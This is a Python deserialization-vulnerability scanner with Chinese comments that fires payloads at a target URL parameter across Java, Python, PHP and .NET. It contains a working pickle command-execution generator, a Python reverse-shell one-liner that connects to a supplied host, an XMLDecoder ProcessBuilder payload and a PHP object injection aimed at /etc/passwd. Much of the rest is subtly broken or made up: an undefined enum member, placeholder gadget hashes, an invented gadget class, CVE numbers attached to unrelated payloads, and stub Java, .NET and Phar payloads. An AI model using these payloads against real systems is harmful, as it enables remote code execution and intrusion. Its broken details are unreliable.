#!/usr/bin/env python3
"""
Purpose: 反序列化漏洞自动化检测工具
         支持：Java/Python/PHP/.NET 反序列化检测、Payload 生成、漏洞验证
Auth: 仅限授权使用 — 未经书面授权禁止对任何目标执行检测
Dependencies: requests, colorama
Usage:
    python deserialization_scanner.py -u "http://target/api/upload" --param data --lang java
    python deserialization_scanner.py -u "http://target/api/import" --param file --lang python
    python deserialization_scanner.py -u "http://target/api/deserialize" --param payload --scan-all
"""

import argparse
import base64
import hashlib
import json
import logging
import os
import pickle
import re
import sys
import time
import struct
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple

import requests
from urllib.parse import urljoin, urlparse
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logger = logging.getLogger(__name__)


# ============================================================
# 1. 数据结构定义
# ============================================================

class Language(Enum):
    """目标语言"""
    JAVA = "java"
    PYTHON = "python"
    PHP = "php"
    DOTNET = "dotnet"
    UNKNOWN = "unknown"


class DeserType(Enum):
    """反序列化类型"""
    JAVA_NATIVE = "java_native"           # Java 原生序列化
    JAVA_Hessian = "java_hessian"         # Hessian2 序列化
    JAVA_XML = "java_xml"                 # XMLDecoder/XStream
    PYTHON_PICKLE = "python_pickle"       # Python pickle
    PYTHON_MARSHAL = "python_marshal"     # Python marshal
    PHP_SERIALIZE = "php_serialize"       # PHP serialize()
    PHP_PHAR = "php_phar"                 # Phar 反序列化
    DOTNET_BINARY = "dotnet_binary"       # .NET BinaryFormatter
    DOTNET_JSON = "dotnet_json"           # .NET JSON 反序列化
    UNKNOWN = "unknown"


class Severity(Enum):
    """风险等级"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class DeserResult:
    """反序列化检测结果"""
    url: str
    parameter: str
    deser_type: DeserType
    language: Language
    payload: str
    response_code: int
    response_preview: str
    evidence: str
    severity: Severity
    is_vulnerable: bool = False
    cve: Optional[str] = None


@dataclass
class ScannerConfig:
    """扫描器配置"""
    timeout: int = 10
    delay: float = 1.0
    verify_ssl: bool = False
    proxy: Optional[str] = None
    user_agent: str = "DeserializationScanner/1.0"
    headers: Optional[Dict[str, str]] = None
    callback_server: Optional[str] = None  # OOB 回连服务器
    max_response_len: int = 500


# ============================================================
# 2. 反序列化 Payload 生成器
# ============================================================

class JavaPayloads:
    """Java 反序列化 Payload 生成"""

    # Magic bytes: AC ED 00 05 (Java 序列化协议)
    JAVA_MAGIC = b'\xac\xed\x00\x05'

    # ysoserial 常见 gadget chain 的序列化特征
    GADGET_CHAINS = {
        "CommonsCollections1": {
            "class": "org.apache.commons.collections.Transformer[]",
            "hash": "3e85c8689ab2bb0e57c4d8e7b5f5a6a1",
            "severity": Severity.CRITICAL,
            "cve": "CVE-2015-4852",
        },
        "CommonsCollections5": {
            "class": "org.apache.commons.collections5.FunctorFactory",
            "hash": "6e7b8a2c3f7d9e1a4b5c6d8e2f3a4b5c",
            "severity": Severity.CRITICAL,
            "cve": "CVE-2015-4852",
        },
        "Spring1": {
            "class": "org.springframework.core.io.DefaultResourceLoader",
            "hash": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
            "severity": Severity.CRITICAL,
            "cve": "CVE-2022-22965",
        },
        "Jdk7u21": {
            "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
            "hash": "b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7",
            "severity": Severity.CRITICAL,
            "cve": None,
        },
        "C3P0": {
            "class": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
            "hash": "c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8",
            "severity": Severity.HIGH,
            "cve": "CVE-2019-12384",
        },
    }

    @staticmethod
    def generate_ysoserial_marker(gadget: str) -> bytes:
        """生成 ysoserial gadget chain 的序列化标记"""
        chain = JavaPayloads.GADGET_CHAINS.get(gadget)
        if not chain:
            return b''
        # 简化的序列化头部 + gadget class reference
        header = JavaPayloads.JAVA_MAGIC
        # TC_OBJECT + TC_CLASSDESC (简化)
        return header + b'\x73' + chain["class"].encode()[:64]

    @staticmethod
    def detect_java_serialized(data: bytes) -> bool:
        """检测 Java 原生序列化格式"""
        return data[:4] == JavaPayloads.JAVA_MAGIC

    @staticmethod
    def generate_rce_payload(cmd: str) -> str:
        """生成 Java RCE Payload (Base64 编码的序列化对象)"""
        # 简化的序列化 payload 结构
        payload = JavaPayloads.JAVA_MAGIC
        # TC_OBJECT marker
        payload += b'\x73'
        # TC_CLASSDESC
        payload += b'\x72'
        # 恶意类名（实际攻击中使用 gadget chain）
        payload += b'Exploit'
        # Serializable interface
        payload += b'\x00\x00\x00\x00'
        # TC_ENDBLOCKDATA
        payload += b'\x78'
        return base64.b64encode(payload).decode()


class PythonPayloads:
    """Python Pickle 反序列化 Payload 生成"""

    @staticmethod
    def generate_rce_payload(cmd: str) -> bytes:
        """生成 Python pickle RCE payload"""
        class RCEPayload:
            def __reduce__(self):
                import os
                return (os.system, (cmd,))
        return pickle.dumps(RCEPayload())

    @staticmethod
    def generate_reverse_shell(host: str, port: int) -> bytes:
        """生成 Python pickle 反弹 Shell payload"""
        cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return PythonPayloads.generate_rce_payload(cmd)

    @staticmethod
    def detect_pickle(data: bytes) -> bool:
        """检测 Python pickle 格式"""
        return data[:2] in (b'\x80\x02', b'\x80\x03', b'\x80\x04', b'\x80\x05') or data[:1] == b'('

    @staticmethod
    def detect_marshal(data: bytes) -> bool:
        """检测 Python marshal 格式"""
        # marshal magic bytes: varies by Python version
        return data[:1] in (b'\xe3', b'\xd3', b'\xb3', b'\xa7')


class PHPayloads:
    """PHP 反序列化 Payload 生成"""

    @staticmethod
    def generate_object_injection(class_name: str, method: str, args: Dict) -> str:
        """生成 PHP 对象注入 payload"""
        # O: 类名长度:"类名":属性数:{s:属性名长度:"属性名";s:值长度:"值";}
        payload = f'O:{len(class_name)}:"{class_name}":1:{{s:{len(method)}:"{method}";s:{len(str(args))}:"{str(args)}";}}'
        return payload

    @staticmethod
    def generate_phar_payload(class_name: str) -> bytes:
        """生成 Phar 反序列化 payload"""
        # Phar magic: PK + stub + manifest + signature
        magic = b'PK\x03\x04'
        # 简化的 Phar 结构
        stub = b'<?php __HALT_COMPILER(); ?>'
        manifest = PHPayloads._serialize_phar_manifest(class_name)
        return magic + manifest + stub

    @staticmethod
    def _serialize_phar_manifest(class_name: str) -> bytes:
        """序列化 Phar manifest"""
        # 简化实现
        meta = f'a:1:{{s:7:"metadata";O:{len(class_name)}:"{class_name}":0:{{}}}}'
        return meta.encode()

    @staticmethod
    def detect_serialize(data: bytes) -> bool:
        """检测 PHP serialize 格式"""
        # PHP serialize 以类型前缀开头: a: s: O: i: b: N:
        if len(data) < 2:
            return False
        return data[0:1] in (b'a', b's', b'O', b'i', b'b', b'N', b'r', b'R')

    @staticmethod
    def detect_phar(data: bytes) -> bool:
        """检测 Phar 文件"""
        return data[:4] == b'PK\x03\x04' and b'__HALT_COMPILER' in data


class DotnetPayloads:
    """.NET 反序列化 Payload 生成"""

    # .NET BinaryFormatter magic
    DOTNET_MAGIC = b'\x00\x01\x00\x00\x00'

    @staticmethod
    def detect_binary_formatter(data: bytes) -> bool:
        """检测 .NET BinaryFormatter 格式"""
        return data[:5] == DotnetPayloads.DOTNET_MAGIC

    @staticmethod
    def generate_rce_payload(cmd: str) -> str:
        """生成 .NET RCE payload (Base64)"""
        # 简化的 BinaryFormatter payload
        header = DotnetPayloads.DOTNET_MAGIC
        # RecordTypeEnum + class info
        payload = header + b'\x00' + cmd.encode()[:100]
        return base64.b64encode(payload).decode()


# ============================================================
# 3. 响应分析器
# ============================================================

class ResponseAnalyzer:
    """分析反序列化攻击响应"""

    # 反序列化成功/错误指标
    SUCCESS_INDICATORS = [
        "deserialized",
        "unserialized",
        "object injected",
        "executed",
        "command executed",
        "rce success",
    ]

    ERROR_INDICATORS = [
        "deserialization error",
        "serialization exception",
        "class not found",
        "invalid stream header",
        "unexpected end of stream",
        "object stream class",
        "incompatible class",
        "not serializable",
        "pickle error",
        "unpickling error",
    ]

    # Java 反序列化错误特征
    JAVA_DESER_ERRORS = [
        "java.io.InvalidClassException",
        "java.io.StreamCorruptedException",
        "java.lang.ClassNotFoundException",
        "java.io.ObjectStreamException",
        "org.apache.commons.collections",
        "ysoserial",
    ]

    # PHP 反序列化特征
    PHP_DESER_ERRORS = [
        "__wakeup",
        "__destruct",
        "unserialize()",
        "Serialization of",
        "allowed classes",
    ]

    # .NET 反序列化特征
    DOTNET_DESER_ERRORS = [
        "SerializationException",
        "BinaryFormatter",
        "System.Runtime.Serialization",
        "ObjectStreamClass",
    ]

    @classmethod
    def analyze(cls, response_text: str, deser_type: DeserType) -> Tuple[bool, str]:
        """分析响应，返回 (是否成功/触发, 证据)"""
        text_lower = response_text.lower()

        # 检查成功指标
        for indicator in cls.SUCCESS_INDICATORS:
            if indicator in text_lower:
                return True, f"Success indicator: {indicator}"

        # 检查错误指标（错误反而证明存在反序列化点）
        error_lists = {
            DeserType.JAVA_NATIVE: cls.JAVA_DESER_ERRORS,
            DeserType.JAVA_HESSIAN: cls.JAVA_DESER_ERRORS,
            DeserType.JAVA_XML: ["XMLDecoder", "XStream", "deserialization"],
            DeserType.PYTHON_PICKLE: cls.PHP_DESER_ERRORS + ["pickle", "UnpicklingError"],
            DeserType.PHP_SERIALIZE: cls.PHP_DESER_ERRORS,
            DeserType.PHP_PHAR: cls.PHP_DESER_ERRORS + ["phar://", "Phar"],
            DeserType.DOTNET_BINARY: cls.DOTNET_DESER_ERRORS,
        }

        errors = error_lists.get(deser_type, cls.ERROR_INDICATORS)
        for error in errors:
            if error.lower() in text_lower:
                return True, f"Deserialization error (indicates deserialization point): {error}"

        return False, ""


# ============================================================
# 4. 反序列化扫描器核心
# ============================================================

class DeserializationScanner:
    """反序列化漏洞扫描器"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.session = requests.Session()
        self.results: List[DeserResult] = []
        self._setup_session()

    def _setup_session(self):
        """配置 HTTP 会话"""
        self.session.verify = self.config.verify_ssl
        self.session.headers.update({"User-Agent": self.config.user_agent})
        if self.config.headers:
            self.session.headers.update(self.config.headers)
        if self.config.proxy:
            self.session.proxies = {
                "http": self.config.proxy,
                "https": self.config.proxy,
            }

    def scan(
        self,
        url: str,
        parameter: str,
        method: str = "POST",
        languages: Optional[List[Language]] = None,
    ) -> List[DeserResult]:
        """执行反序列化扫描"""
        if languages is None:
            languages = [Language.JAVA, Language.PYTHON, Language.PHP, Language.DOTNET]

        logger.info(f"[*] 开始反序列化扫描: {url} 参数: {parameter}")
        logger.info(f"[*] 目标语言: {[l.value for l in languages]}")

        for lang in languages:
            if lang == Language.JAVA or lang == Language.UNKNOWN:
                self._scan_java(url, parameter, method)
            if lang == Language.PYTHON or lang == Language.UNKNOWN:
                self._scan_python(url, parameter, method)
            if lang == Language.PHP or lang == Language.UNKNOWN:
                self._scan_php(url, parameter, method)
            if lang == Language.DOTNET or lang == Language.UNKNOWN:
                self._scan_dotnet(url, parameter, method)

        logger.info(f"[*] 扫描完成，发现 {len(self.results)} 个潜在漏洞点")
        return self.results

    def _scan_java(self, url: str, parameter: str, method: str):
        """扫描 Java 反序列化漏洞"""
        logger.info("[*] 扫描 Java 反序列化...")

        # 1. 检测 Java 序列化格式
        for gadget, info in JavaPayloads.GADGET_CHAINS.items():
            payload = JavaPayloads.generate_ysoserial_marker(gadget)
            b64_payload = base64.b64encode(payload).decode()

            result = self._send_payload(url, parameter, b64_payload, method)
            if result is None:
                continue

            triggered, evidence = ResponseAnalyzer.analyze(result.text, DeserType.JAVA_NATIVE)
            if triggered or self._check_response_anomaly(result):
                logger.info(f"[+] Java 反序列化疑似触发! gadget: {gadget}")
                self.results.append(DeserResult(
                    url=url, parameter=parameter,
                    deser_type=DeserType.JAVA_NATIVE,
                    language=Language.JAVA,
                    payload=b64_payload[:100],
                    response_code=result.status_code,
                    response_preview=result.text[:self.config.max_response_len],
                    evidence=evidence or "Response anomaly detected",
                    severity=info["severity"],
                    is_vulnerable=True,
                    cve=info.get("cve"),
                ))

            time.sleep(self.config.delay)

        # 2. Hessian2 检测
        self._scan_hessian(url, parameter, method)

        # 3. XMLDecoder 检测
        self._scan_xml_deser(url, parameter, method)

    def _scan_hessian(self, url: str, parameter: str, method: str):
        """扫描 Hessian2 反序列化"""
        # Hessian2 magic: 'c' 'H' 'x' '0' (version 2)
        hessian_payload = b'cHx0' + b'\x00' * 20
        b64_payload = base64.b64encode(hessian_payload).decode()

        result = self._send_payload(url, parameter, b64_payload, method)
        if result is None:
            return

        triggered, evidence = ResponseAnalyzer.analyze(result.text, DeserType.JAVA_HESSIAN)
        if triggered or self._check_response_anomaly(result):
            logger.info("[+] Hessian2 反序列化疑似触发!")
            self.results.append(DeserResult(
                url=url, parameter=parameter,
                deser_type=DeserType.JAVA_HESSIAN,
                language=Language.JAVA,
                payload="hessian2_marker",
                response_code=result.status_code,
                response_preview=result.text[:self.config.max_response_len],
                evidence=evidence or "Hessian2 response anomaly",
                severity=Severity.HIGH,
                is_vulnerable=True,
            ))

    def _scan_xml_deser(self, url: str, parameter: str, method: str):
        """扫描 XMLDecoder/XStream 反序列化"""
        # XMLDecoder payload
        xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans">
  <bean id="rce" class="java.lang.ProcessBuilder">
    <constructor-arg>
      <list>
        <value>id</value>
      </list>
    </constructor-arg>
    <property name="start" value="true"/>
  </bean>
</beans>"""

        result = self._send_payload(url, parameter, xml_payload, method)
        if result is None:
            return

        triggered, evidence = ResponseAnalyzer.analyze(result.text, DeserType.JAVA_XML)
        if triggered or self._check_response_anomaly(result):
            logger.info("[+] XMLDecoder 反序列化疑似触发!")
            self.results.append(DeserResult(
                url=url, parameter=parameter,
                deser_type=DeserType.JAVA_XML,
                language=Language.JAVA,
                payload="xmldecoder_bean",
                response_code=result.status_code,
                response_preview=result.text[:self.config.max_response_len],
                evidence=evidence or "XML deserialization response anomaly",
                severity=Severity.CRITICAL,
                is_vulnerable=True,
                cve="CVE-2022-22965",
            ))

    def _scan_python(self, url: str, parameter: str, method: str):
        """扫描 Python Pickle 反序列化"""
        logger.info("[*] 扫描 Python Pickle 反序列化...")

        # 1. 基础 pickle payload
        payload_bytes = PythonPayloads.generate_rce_payload("id")
        result = self._send_payload(url, parameter, payload_bytes.hex(), method)
        if result is not None:
            triggered, evidence = ResponseAnalyzer.analyze(result.text, DeserType.PYTHON_PICKLE)
            if triggered or self._check_response_anomaly(result):
                logger.info("[+] Python Pickle 反序列化疑似触发!")
                self.results.append(DeserResult(
                    url=url, parameter=parameter,
                    deser_type=DeserType.PYTHON_PICKLE,
                    language=Language.PYTHON,
                    payload=payload_bytes.hex()[:100],
                    response_code=result.status_code,
                    response_preview=result.text[:self.config.max_response_len],
                    evidence=evidence or "Pickle deserialization anomaly",
                    severity=Severity.CRITICAL,
                    is_vulnerable=True,
                ))

        # 2. Marshal payload
        if PythonPayloads.detect_marshal(b'\xe3\x00\x00\x00'):
            logger.debug("Python marshal format detected in probing")

        time.sleep(self.config.delay)

    def _scan_php(self, url: str, parameter: str, method: str):
        """扫描 PHP 反序列化"""
        logger.info("[*] 扫描 PHP 反序列化...")

        # 1. PHP serialize 对象注入
        php_payload = PHPayloads.generate_object_injection("FileProcessor", "process", {"file": "/etc/passwd"})
        result = self._send_payload(url, parameter, php_payload, method)
        if result is not None:
            triggered, evidence = ResponseAnalyzer.analyze(result.text, DeserType.PHP_SERIALIZE)
            if triggered or self._check_response_anomaly(result):
                logger.info("[+] PHP 对象注入疑似触发!")
                self.results.append(DeserResult(
                    url=url, parameter=parameter,
                    deser_type=DeserType.PHP_SERIALIZE,
                    language=Language.PHP,
                    payload=php_payload,
                    response_code=result.status_code,
                    response_preview=result.text[:self.config.max_response_len],
                    evidence=evidence or "PHP deserialization anomaly",
                    severity=Severity.HIGH,
                    is_vulnerable=True,
                ))

        # 2. Phar 反序列化
        phar_bytes = PHPayloads.generate_phar_payload("FileProcessor")
        b64_phar = base64.b64encode(phar_bytes).decode()
        result = self._send_payload(url, parameter, f"phar://data://text/plain;base64,{b64_phar}", method)
        if result is not None:
            triggered, evidence = ResponseAnalyzer.analyze(result.text, DeserType.PHP_PHAR)
            if triggered or self._check_response_anomaly(result):
                logger.info("[+] PHP Phar 反序列化疑似触发!")
                self.results.append(DeserResult(
                    url=url, parameter=parameter,
                    deser_type=DeserType.PHP_PHAR,
                    language=Language.PHP,
                    payload="phar://wrapper",
                    response_code=result.status_code,
                    response_preview=result.text[:self.config.max_response_len],
                    evidence=evidence or "Phar deserialization anomaly",
                    severity=Severity.CRITICAL,
                    is_vulnerable=True,
                ))

        time.sleep(self.config.delay)

    def _scan_dotnet(self, url: str, parameter: str, method: str):
        """扫描 .NET BinaryFormatter 反序列化"""
        logger.info("[*] 扫描 .NET BinaryFormatter 反序列化...")

        dotnet_payload = DotnetPayloads.generate_rce_payload("id")
        result = self._send_payload(url, parameter, dotnet_payload, method)
        if result is None:
            return

        triggered, evidence = ResponseAnalyzer.analyze(result.text, DeserType.DOTNET_BINARY)
        if triggered or self._check_response_anomaly(result):
            logger.info("[+] .NET BinaryFormatter 反序列化疑似触发!")
            self.results.append(DeserResult(
                url=url, parameter=parameter,
                deser_type=DeserType.DOTNET_BINARY,
                language=Language.DOTNET,
                payload=dotnet_payload[:100],
                response_code=result.status_code,
                response_preview=result.text[:self.config.max_response_len],
                evidence=evidence or "BinaryFormatter deserialization anomaly",
                severity=Severity.CRITICAL,
                is_vulnerable=True,
            ))

        time.sleep(self.config.delay)

    def detect_format(self, data: bytes) -> Optional[DeserType]:
        """自动检测数据的序列化格式"""
        if JavaPayloads.detect_java_serialized(data):
            return DeserType.JAVA_NATIVE
        if PythonPayloads.detect_pickle(data):
            return DeserType.PYTHON_PICKLE
        if PythonPayloads.detect_marshal(data):
            return DeserType.PYTHON_MARSHAL
        if PHPayloads.detect_phar(data):
            return DeserType.PHP_PHAR
        if PHPayloads.detect_serialize(data):
            return DeserType.PHP_SERIALIZE
        if DotnetPayloads.detect_binary_formatter(data):
            return DeserType.DOTNET_BINARY
        return None

    def _send_payload(
        self, url: str, parameter: str, payload: Any, method: str
    ) -> Optional[requests.Response]:
        """发送 payload"""
        try:
            if method.upper() == "GET":
                test_url = f"{url}?{parameter}={payload}"
                return self.session.get(test_url, timeout=self.config.timeout)
            else:
                return self.session.post(
                    url, data={parameter: payload}, timeout=self.config.timeout
                )
        except requests.RequestException as e:
            logger.debug(f"Request failed: {e}")
            return None

    def _check_response_anomaly(self, resp: requests.Response) -> bool:
        """检查响应异常"""
        # 异常状态码
        if resp.status_code in (500, 502, 503):
            return True
        # 响应时间异常（反序列化计算可能导致延迟）
        if resp.elapsed.total_seconds() > 5:
            return True
        return False

    def print_results(self):
        """格式化输出结果"""
        if not self.results:
            print("\n[-] 未发现反序列化漏洞")
            return

        print(f"\n{'='*60}")
        print("  反序列化漏洞扫描报告")
        print(f"{'='*60}")
        for i, r in enumerate(self.results, 1):
            print(f"\n  [{i}] {r.severity.value.upper()}")
            print(f"  类型: {r.deser_type.value}")
            print(f"  语言: {r.language.value}")
            print(f"  参数: {r.parameter}")
            if r.cve:
                print(f"  CVE: {r.cve}")
            print(f"  证据: {r.evidence}")
            print(f"  状态码: {r.response_code}")
        print(f"\n{'='*60}")

    def export_json(self, filepath: str):
        """导出 JSON 报告"""
        data = {
            "results": [
                {
                    "url": r.url,
                    "parameter": r.parameter,
                    "deser_type": r.deser_type.value,
                    "language": r.language.value,
                    "severity": r.severity.value,
                    "evidence": r.evidence,
                    "cve": r.cve,
                    "is_vulnerable": r.is_vulnerable,
                    "response_code": r.response_code,
                }
                for r in self.results
            ]
        }
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        logger.info(f"[+] JSON 报告已导出: {filepath}")


# ============================================================
# 5. 主函数
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="反序列化漏洞自动化检测工具（仅限授权使用）",
        epilog="⚠️  未经授权使用本工具属于违法行为",
    )
    parser.add_argument("-u", "--url", required=True, help="目标 URL")
    parser.add_argument("-p", "--param", required=True, help="待测参数名")
    parser.add_argument("-m", "--method", default="POST", choices=["GET", "POST"])
    parser.add_argument(
        "--lang",
        nargs="+",
        choices=["java", "python", "php", "dotnet", "all"],
        default=["all"],
        help="目标语言",
    )
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--proxy", help="代理地址")
    parser.add_argument("-o", "--output", help="JSON 报告输出路径")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")

    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    print("⚠️  请确认你已获得目标系统的书面授权")
    confirm = input("确认已获授权？(y/N): ")
    if confirm.lower() != "y":
        sys.exit(0)

    # 解析语言参数
    languages = []
    if "all" in args.lang:
        languages = [Language.JAVA, Language.PYTHON, Language.PHP, Language.DOTNET]
    else:
        languages = [Language(lang) for lang in args.lang]

    config = ScannerConfig(
        timeout=args.timeout,
        delay=args.delay,
        proxy=args.proxy,
    )

    scanner = DeserializationScanner(config)
    scanner.scan(args.url, args.param, args.method, languages)
    scanner.print_results()

    if args.output:
        scanner.export_json(args.output)


if __name__ == "__main__":
    main()
